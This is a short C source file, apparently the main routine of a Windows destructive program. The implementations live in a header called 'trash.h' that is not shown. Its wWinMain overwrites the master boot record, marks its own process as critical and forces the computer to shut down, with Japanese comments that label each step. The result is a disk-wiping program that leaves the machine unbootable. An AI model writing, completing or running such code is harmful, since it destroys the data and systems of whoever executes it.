#include "trash.h"

INT
WINAPI
wWinMain (
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	OverrideMBR ( );                     //MBR消す
	SetProcessCritical ( );            //クリティカルに設定
	ForceShutdownComputer ( ); //パワーオフ
	return 0;
}